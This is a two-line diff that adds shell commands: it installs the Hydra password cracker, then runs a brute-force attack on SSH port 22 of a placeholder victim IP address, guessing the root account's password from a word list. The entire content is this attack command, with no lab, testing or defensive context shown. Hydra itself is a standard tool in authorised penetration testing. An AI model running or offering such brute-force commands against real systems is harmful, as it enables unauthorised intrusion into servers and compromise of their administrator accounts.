@@ -1,0 +1,2 @@
+apt install hydra
+hydra -s 22 -l root -P shortlist.txt <victim_IP> -t 4 -V ssh
